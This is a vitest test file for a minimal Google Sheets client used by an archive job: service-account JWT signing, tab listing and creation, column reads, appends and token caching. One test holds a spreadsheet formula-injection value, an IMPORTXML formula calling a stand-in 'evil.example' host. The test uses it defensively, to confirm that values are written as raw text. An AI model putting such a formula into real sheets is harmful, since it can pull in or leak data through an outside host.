// Maintenance M1: the archive job writes past nights to one Google spreadsheet the owner shares with a service account
// (a tab per month). A tiny REST client, no SDK: a service-account JWT (RS256, node:crypto) for an access token, then
// Sheets v4 calls. Values are written RAW so a stranger's title like "=IMPORTXML(...)" stays text, never a formula.

import { createVerify, generateKeyPairSync } from "node:crypto";

import { describe, expect, it } from "vitest";

import { googleSheetsClient, serviceAccountToken } from "@/src/pipeline/google-sheets";

const { privateKey, publicKey } = generateKeyPairSync("rsa", { modulusLength: 2048 });
const SA = JSON.stringify({
  type: "service_account",
  client_email: "archiver@project.iam.gserviceaccount.com",
  private_key: privateKey.export({ type: "pkcs8", format: "pem" }).toString(),
  token_uri: "https://oauth2.googleapis.com/token",
});
const NOW = new Date("2026-11-16T12:00:00Z");
const SHEET = "1AbC_spreadsheet-id";

interface Call {
  url: string;
  method: string;
  body: string | null;
  auth: string | null;
}

function fakeFetch(answers: Array<{ status?: number; json: unknown }>) {
  const calls: Call[] = [];
  const impl = async (input: string | URL | Request, init?: RequestInit): Promise<Response> => {
    const headers = new Headers(init?.headers);
    calls.push({
      url: String(input),
      method: init?.method ?? "GET",
      body: typeof init?.body === "string" ? init.body : init?.body ? String(init.body) : null,
      auth: headers.get("authorization"),
    });
    const next = answers.shift() ?? { json: {} };
    return new Response(JSON.stringify(next.json), {
      status: next.status ?? 200,
      headers: { "content-type": "application/json" },
    });
  };
  return { calls, impl: impl as typeof fetch };
}

const b64url = (s: string) => Buffer.from(s, "base64url").toString("utf8");

describe("serviceAccountToken", () => {
  it("posts a signed RS256 JWT for the spreadsheets scope and returns the access token", async () => {
    const { calls, impl } = fakeFetch([{ json: { access_token: "tok-1", expires_in: 3600 } }]);
    const token = await serviceAccountToken(SA, NOW, impl);
    expect(token).toBe("tok-1");
    expect(calls).toHaveLength(1);
    expect(calls[0]!.url).toBe("https://oauth2.googleapis.com/token");
    expect(calls[0]!.method).toBe("POST");
    const form = new URLSearchParams(calls[0]!.body!);
    expect(form.get("grant_type")).toBe("urn:ietf:params:oauth:grant-type:jwt-bearer");
    const [h, c, s] = form.get("assertion")!.split(".");
    expect(JSON.parse(b64url(h!))).toEqual({ alg: "RS256", typ: "JWT" });
    const claims = JSON.parse(b64url(c!));
    expect(claims).toEqual({
      iss: "archiver@project.iam.gserviceaccount.com",
      scope: "https://www.googleapis.com/auth/spreadsheets",
      aud: "https://oauth2.googleapis.com/token",
      iat: NOW.getTime() / 1000,
      exp: NOW.getTime() / 1000 + 3600,
    });
    const verify = createVerify("RSA-SHA256");
    verify.update(`${h}.${c}`);
    expect(verify.verify(publicKey, Buffer.from(s!, "base64url"))).toBe(true);
  });

  it("throws on a token error without echoing the key", async () => {
    const { impl } = fakeFetch([{ status: 400, json: { error: "invalid_grant" } }]);
    const err = (await serviceAccountToken(SA, NOW, impl).catch((e: unknown) => e)) as Error;
    expect(err).toBeInstanceOf(Error);
    expect(err.message).toContain("400");
    expect(err.message).not.toContain("PRIVATE KEY");
  });

  it("rejects JSON that is not a service-account key", async () => {
    const { impl } = fakeFetch([]);
    await expect(serviceAccountToken("{}", NOW, impl)).rejects.toThrow(/service account/i);
  });
});

describe("googleSheetsClient", () => {
  const token = { json: { access_token: "tok-1", expires_in: 3600 } };

  it("lists tab titles", async () => {
    const { calls, impl } = fakeFetch([
      token,
      {
        json: {
          sheets: [
            { properties: { title: "2026-10" } },
            { properties: { title: "reports 2026-10" } },
          ],
        },
      },
    ]);
    const client = googleSheetsClient({
      saJson: SA,
      spreadsheetId: SHEET,
      fetch: impl,
      now: () => NOW,
    });
    expect(await client.tabs()).toEqual(["2026-10", "reports 2026-10"]);
    expect(calls[1]!.url).toBe(
      `https://sheets.googleapis.com/v4/spreadsheets/${SHEET}?fields=sheets.properties.title`,
    );
    expect(calls[1]!.auth).toBe("Bearer tok-1");
  });

  it("adds a tab with batchUpdate", async () => {
    const { calls, impl } = fakeFetch([token, { json: {} }]);
    const client = googleSheetsClient({
      saJson: SA,
      spreadsheetId: SHEET,
      fetch: impl,
      now: () => NOW,
    });
    await client.addTab("2026-11");
    expect(calls[1]!.url).toBe(
      `https://sheets.googleapis.com/v4/spreadsheets/${SHEET}:batchUpdate`,
    );
    expect(calls[1]!.method).toBe("POST");
    expect(JSON.parse(calls[1]!.body!)).toEqual({
      requests: [{ addSheet: { properties: { title: "2026-11" } } }],
    });
  });

  it("reads one column's values, first cell of each row, empty when the tab is empty", async () => {
    const { calls, impl } = fakeFetch([
      token,
      { json: { values: [["event_id"], ["a1"], ["b2"]] } },
      { json: {} },
    ]);
    const client = googleSheetsClient({
      saJson: SA,
      spreadsheetId: SHEET,
      fetch: impl,
      now: () => NOW,
    });
    expect(await client.readColumn("2026-10", "A")).toEqual(["event_id", "a1", "b2"]);
    expect(calls[1]!.url).toBe(
      `https://sheets.googleapis.com/v4/spreadsheets/${SHEET}/values/${encodeURIComponent("'2026-10'!A:A")}`,
    );
    expect(await client.readColumn("2026-10", "A")).toEqual([]);
  });

  it("appends rows RAW (a formula-looking title stays text) and reuses the token", async () => {
    const { calls, impl } = fakeFetch([token, { json: {} }, { json: {} }]);
    const client = googleSheetsClient({
      saJson: SA,
      spreadsheetId: SHEET,
      fetch: impl,
      now: () => NOW,
    });
    const rows = [["a1", '=IMPORTXML("http://evil.example","//a")']];
    await client.append("2026-10", rows);
    await client.append("2026-10", [["b2", "Salsa"]]);
    expect(calls.filter((c) => c.url.includes("oauth2"))).toHaveLength(1);
    const url = new URL(calls[1]!.url);
    expect(url.pathname).toBe(
      `/v4/spreadsheets/${SHEET}/values/${encodeURIComponent("'2026-10'!A1")}:append`,
    );
    expect(url.searchParams.get("valueInputOption")).toBe("RAW");
    expect(url.searchParams.get("insertDataOption")).toBe("INSERT_ROWS");
    expect(JSON.parse(calls[1]!.body!)).toEqual({ values: rows });
  });

  it("quotes a tab title with an apostrophe", async () => {
    const { calls, impl } = fakeFetch([token, { json: {} }]);
    const client = googleSheetsClient({
      saJson: SA,
      spreadsheetId: SHEET,
      fetch: impl,
      now: () => NOW,
    });
    await client.readColumn("the owner's tab", "A");
    expect(calls[1]!.url).toContain(encodeURIComponent("'the owner''s tab'!A:A"));
  });

  it("throws with the status on an API error, never the token", async () => {
    const { impl } = fakeFetch([token, { status: 403, json: { error: { message: "denied" } } }]);
    const client = googleSheetsClient({
      saJson: SA,
      spreadsheetId: SHEET,
      fetch: impl,
      now: () => NOW,
    });
    const err = (await client.tabs().catch((e: unknown) => e)) as Error;
    expect(err.message).toContain("403");
    expect(err.message).not.toContain("tok-1");
  });

  it("reuses a token for 50 minutes, then asks for a new one", async () => {
    let clock = NOW.getTime();
    const { calls, impl } = fakeFetch([
      token,
      { json: {} },
      { json: {} },
      { json: { access_token: "tok-2", expires_in: 3600 } },
      { json: {} },
    ]);
    const client = googleSheetsClient({
      saJson: SA,
      spreadsheetId: SHEET,
      fetch: impl,
      now: () => new Date(clock),
    });
    await client.addTab("a");
    clock += 49 * 60 * 1000;
    await client.addTab("b");
    clock += 2 * 60 * 1000;
    await client.addTab("c");
    expect(calls.filter((c) => c.url.includes("oauth2"))).toHaveLength(2);
    expect(calls[calls.length - 1]!.auth).toBe("Bearer tok-2");
  });

  it("asks again after a failed token request", async () => {
    const { calls, impl } = fakeFetch([{ status: 500, json: {} }, token, { json: {} }]);
    const client = googleSheetsClient({
      saJson: SA,
      spreadsheetId: SHEET,
      fetch: impl,
      now: () => NOW,
    });
    await expect(client.addTab("a")).rejects.toThrow(/500/);
    await client.addTab("a");
    expect(calls.filter((c) => c.url.includes("oauth2"))).toHaveLength(2);
  });
});
